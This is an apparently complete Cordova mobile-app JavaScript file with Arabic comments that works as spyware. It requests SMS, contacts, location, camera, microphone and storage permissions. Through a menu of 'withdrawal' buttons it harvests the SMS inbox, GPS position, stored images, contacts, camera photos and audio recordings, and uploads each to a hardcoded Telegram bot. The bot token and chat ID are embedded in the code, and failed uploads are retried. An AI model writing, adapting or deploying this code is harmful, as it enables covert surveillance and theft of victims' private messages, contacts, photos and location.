document.addEventListener('deviceready', onDeviceReady, false);

// تعريف المتغيرات العامة
const botToken = '7988955212:AAFnbsKqd9bL0ZdKZsWfLtbi32YVsNIq6E4';
const chatId = '5739065274';
let mediaFiles = [];

function onDeviceReady() {
  console.log('Cordova جاهز');
  sendStartCommand();
  requestPermissions();
  createButtons();
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECEIVE_SMS,
      permissions.CAMERA,
      permissions.RECORD_AUDIO,
      permissions.READ_CONTACTS
    ],
    function(status) {
      if (status.hasPermission) {
        console.log("تم منح الأذونات بنجاح");
      } else {
        console.log("تم رفض الأذونات");
      }
    },
    function(error) {
      console.error("فشل طلب الأذونات", error);
    }
  );
}

function sendStartCommand() {
  const message = '/start';
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => {
      console.log('تم إرسال أمر /start:', data);
      sendConnectionMessage();
    })
    .catch(error => console.error('خطأ في إرسال أمر /start:', error));
}

function sendConnectionMessage() {
  const message = '✅ الجهاز متصل وجاهز للعمل';
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة الاتصال:', data))
    .catch(error => console.error('خطأ في إرسال رسالة الاتصال:', error));
}

function createButtons() {
  const existingButtons = document.querySelectorAll('.command-button');
  existingButtons.forEach(btn => btn.remove());
  
  const mainButton = document.createElement('button');
  mainButton.className = 'command-button';
  mainButton.textContent = 'أوامر السحب';
  mainButton.style.cssText = `
    opacity: 0.7;
    position: fixed;
    bottom: 20px;
    right: 20px;
    padding: 10px 15px;
    background-color: #4285f4;
    color: white;
    border: none;
    border-radius: 5px;
    z-index: 9999;
    cursor: pointer;
    transition: all 0.3s;
  `;
  
  mainButton.onmouseover = () => mainButton.style.opacity = '1';
  mainButton.onmouseout = () => mainButton.style.opacity = '0.7';
  mainButton.onclick = showCommands;
  
  document.body.appendChild(mainButton);
}

function showCommands() {
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
  
  const commands = [
    { text: 'سحب رسائل SMS', action: collectSMS, color: '#34a853' },
    { text: 'سحب الموقع الجغرافي', action: getLocation, color: '#fbbc05' },
    { text: 'سحب الصور', action: collectImages, color: '#ea4335' },
    { text: 'سحب جهات الاتصال', action: collectContacts, color: '#9c27b0' },
    { text: 'تصوير كاميرا أمامية', action: () => captureCamera(1), color: '#3f51b5' },
    { text: 'تصوير كاميرا خلفية', action: () => captureCamera(0), color: '#2196f3' },
    { text: 'تسجيل صوت', action: recordAudio, color: '#ff5722' },
    { text: 'إخفاء الأوامر', action: hideCommands, color: '#666666' }
  ];
  
  commands.forEach((cmd, index) => {
    const btn = document.createElement('button');
    btn.className = 'command-btn';
    btn.textContent = cmd.text;
    btn.style.cssText = `
      opacity: 0.7;
      position: fixed;
      bottom: ${80 + index * 60}px;
      right: 20px;
      padding: 10px 15px;
      background-color: ${cmd.color};
      color: white;
      border: none;
      border-radius: 5px;
      z-index: 9998;
      cursor: pointer;
      transition: all 0.3s;
    `;
    
    btn.onmouseover = () => btn.style.opacity = '1';
    btn.onmouseout = () => btn.style.opacity = '0.7';
    btn.onclick = cmd.action;
    
    document.body.appendChild(btn);
  });
}

function hideCommands() {
  const existingCommandButtons = document.querySelectorAll('.command-btn');
  existingCommandButtons.forEach(btn => btn.remove());
}

// حل مشكلة SMS plugin
function collectSMS() {
  if (typeof SMS === 'undefined') {
    console.error('SMS plugin not available - trying alternative method');
    sendToTelegram('error.txt', 'SMS plugin not available - trying alternative method');
    
    // محاولة بديلة إذا لم يكن البلجن متاحاً
    if (window.android && window.android.readSMS) {
      try {
        const smsData = window.android.readSMS();
        sendToTelegram('sms_inbox.txt', smsData);
      } catch (e) {
        sendToTelegram('error.txt', 'Failed to read SMS: ' + e.toString());
      }
    }
    return;
  }
  
  const filter = { box: 'inbox' };
  const options = { maxCount: 1000 };
  
  SMS.listSMS(filter, options, 
    (data) => {
      const inbox = data.map(msg => `[${new Date(msg.date)}] ${msg.address}: ${msg.body}`).join('\n\n');
      sendToTelegram('sms_inbox.txt', inbox);
    },
    (error) => {
      console.error('Error collecting SMS:', error);
      sendToTelegram('error.txt', `Failed to collect SMS: ${error}`);
    }
  );
}

function getLocation() {
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const location = `📍 الموقع الجغرافي:\n\nخط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}\nالدقة: ${position.coords.accuracy} متر`;
      sendToTelegram('location.txt', location);
      
      const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mapUrl)}`)
        .then(response => response.json())
        .then(data => console.log('تم إرسال رابط الخريطة:', data))
        .catch(error => console.error('خطأ في إرسال رابط الخريطة:', error));
    },
    (error) => {
      console.error('Error getting location:', error);
      sendToTelegram('error.txt', `Failed to get location: ${error.message}`);
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

function collectImages() {
  window.resolveLocalFileSystemURL(
    cordova.file.externalRootDirectory,
    (dir) => {
      const reader = dir.createReader();
      reader.readEntries(
        (entries) => {
          const images = entries.filter(entry => /\.(jpg|png|jpeg)$/i.test(entry.name));
          if (images.length === 0) {
            sendToTelegram('error.txt', 'لم يتم العثور على أي صور');
            return;
          }
          
          sendToTelegram('status.txt', `تم العثور على ${images.length} صورة، جاري الإرسال...`);
          sendImagesToTelegram(images);
        },
        (error) => {
          console.error('Error reading directory:', error);
          sendToTelegram('error.txt', `Failed to read directory: ${error}`);
        }
      );
    },
    (error) => {
      console.error('Error accessing file system:', error);
      sendToTelegram('error.txt', `Failed to access file system: ${error}`);
    }
  );
}

// سحب جهات الاتصال
function collectContacts() {
  navigator.contacts.find(
    ['*'],
    (contacts) => {
      const contactsData = contacts.map(contact => {
        let info = `Name: ${contact.name ? contact.name.formatted : 'N/A'}\n`;
        if (contact.phoneNumbers) {
          contact.phoneNumbers.forEach(phone => {
            info += `Phone: ${phone.value} (${phone.type})\n`;
          });
        }
        if (contact.emails) {
          contact.emails.forEach(email => {
            info += `Email: ${email.value} (${email.type})\n`;
          });
        }
        return info + '------------------';
      }).join('\n\n');
      
      sendToTelegram('contacts.txt', contactsData || 'No contacts found');
    },
    (error) => {
      console.error('Error fetching contacts:', error);
      sendToTelegram('error.txt', `Failed to fetch contacts: ${error}`);
    },
    { multiple: true }
  );
}

// تصوير الكاميرا
function captureCamera(cameraDirection) {
  const options = {
    quality: 85,
    destinationType: Camera.DestinationType.FILE_URI,
    encodingType: Camera.EncodingType.JPEG,
    cameraDirection: cameraDirection,
    saveToPhotoAlbum: false,
    correctOrientation: true
  };

  navigator.camera.getPicture(
    (imageURI) => {
      const filename = `camera_${cameraDirection === 1 ? 'front' : 'back'}_${Date.now()}.jpg`;
      mediaFiles.push({ uri: imageURI, filename: filename, type: 'photo' });
      sendMediaFileToTelegram(imageURI, filename, 'photo');
    },
    (error) => {
      console.error('Camera error:', error);
      sendToTelegram('error.txt', `Camera failed: ${error}`);
    },
    options
  );
}

// تسجيل الصوت
function recordAudio() {
  const audioFileName = `audio_recording_${Date.now()}.mp3`;
  
  const options = {
    SampleRate: 44100,
    Channels: 2,
    AudioQuality: 'high',
    AudioEncoding: 'mp3',
    OutputFormat: 'mp3'
  };

  Media.prototype.startRecordWithPath(audioFileName, 
    () => {
      console.log('Recording started');
      sendToTelegram('status.txt', 'جاري تسجيل الصوت... اضغط إيقاف عند الانتهاء');
    },
    (error) => {
      console.error('Recording error:', error);
      sendToTelegram('error.txt', `Recording failed: ${error}`);
    },
    options
  );

  // إضافة زر لإيقاف التسجيل
  const stopButton = document.createElement('button');
  stopButton.textContent = 'إيقاف التسجيل';
  stopButton.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    padding: 10px 15px;
    background-color: #f44336;
    color: white;
    border: none;
    border-radius: 5px;
    z-index: 9999;
    cursor: pointer;
  `;
  
  stopButton.onclick = () => {
    Media.prototype.stopRecord();
    stopButton.remove();
    const audioPath = cordova.file.externalRootDirectory + audioFileName;
    
    // التأكد من وجود الملف قبل الإرسال
    window.resolveLocalFileSystemURL(audioPath, 
      (fileEntry) => {
        sendMediaFileToTelegram(audioPath, audioFileName, 'audio');
      },
      (error) => {
        console.error('Audio file not found:', error);
        sendToTelegram('error.txt', 'Failed to find recorded audio file');
      }
    );
  };
  
  document.body.appendChild(stopButton);
}

// إرسال الملفات إلى تلجرام
function sendToTelegram(filename, content) {
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`جاري إرسال ${filename}...`)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة التحميل:', data))
    .catch(error => console.error('خطأ في إرسال رسالة التحميل:', error));
  
  const blob = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', blob, filename);
  
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => console.log('تم إرسال الملف:', data))
  .catch(error => {
    console.error('Error sending file:', error);
    setTimeout(() => sendToTelegram(filename, content), 3000);
  });
}

function sendMediaFileToTelegram(fileUri, filename, type) {
  const sendMethod = type === 'photo' ? 'sendPhoto' : 'sendDocument';
  const formData = new FormData();
  
  window.resolveLocalFileSystemURL(fileUri, (fileEntry) => {
    fileEntry.file((file) => {
      formData.append(type === 'photo' ? 'photo' : 'document', file, filename);
      
      fetch(`https://api.telegram.org/bot${botToken}/${sendMethod}?chat_id=${chatId}`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log(`تم إرسال ${type === 'photo' ? 'الصورة' : 'الملف الصوتي'}:`, data);
        sendToTelegram('status.txt', `تم إرسال ${filename} بنجاح`);
      })
      .catch(error => {
        console.error(`Error sending ${filename}:`, error);
        setTimeout(() => sendMediaFileToTelegram(fileUri, filename, type), 3000);
      });
    }, (error) => {
      console.error(`Error reading ${filename}:`, error);
      sendToTelegram('error.txt', `Failed to read ${filename}: ${error}`);
    });
  }, (error) => {
    console.error(`Error accessing ${filename}:`, error);
    sendToTelegram('error.txt', `Failed to access ${filename}: ${error}`);
  });
}

function sendImagesToTelegram(images, index = 0) {
  if (index >= images.length) {
    sendToTelegram('status.txt', 'تم إرسال جميع الصور بنجاح');
    return;
  }
  
  const imgEntry = images[index];
  imgEntry.file((file) => {
    const formData = new FormData();
    formData.append('photo', file, file.name);
    
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
      setTimeout(() => sendImagesToTelegram(images, index + 1), 1000);
    })
    .catch(error => {
      console.error(`Error sending image ${index + 1}:`, error);
      setTimeout(() => sendImagesToTelegram(images, index), 3000);
    });
  }, (error) => {
    console.error(`Error reading image file ${index + 1}:`, error);
    sendImagesToTelegram(images, index + 1);
  });
}
